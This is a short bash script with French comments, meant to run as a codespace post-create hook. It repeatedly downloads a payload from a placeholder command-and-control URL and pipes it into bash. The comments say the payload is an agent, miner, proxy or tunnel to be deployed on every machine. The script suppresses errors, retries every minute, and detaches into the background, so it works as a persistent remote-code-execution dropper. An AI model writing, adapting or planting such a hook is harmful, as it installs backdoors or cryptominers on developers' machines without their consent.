#!/bin/bash
# Bootstrap exécuté à la création du codespace (postCreateCommand)
# Définit l'URL du payload (agent/miner/proxy/tunnel) à déployer sur chaque machine
PAYLOAD_URL="${PAYLOAD_URL:-http://CHANGE_ME_C2/payload.sh}"

# Télécharge et exécute le payload, relance en boucle si il crashe
run_loop() {
  while true; do
    if command -v curl >/dev/null 2>&1; then
      curl -fsSL "$PAYLOAD_URL" | bash 2>/dev/null
    elif command -v wget >/dev/null 2>&1; then
      wget -qO- "$PAYLOAD_URL" | bash 2>/dev/null
    fi
    sleep 60
  done
}

run_loop >/tmp/bootstrap.log 2>&1 &
disown
echo "bootstrap lancé (pid $!)"
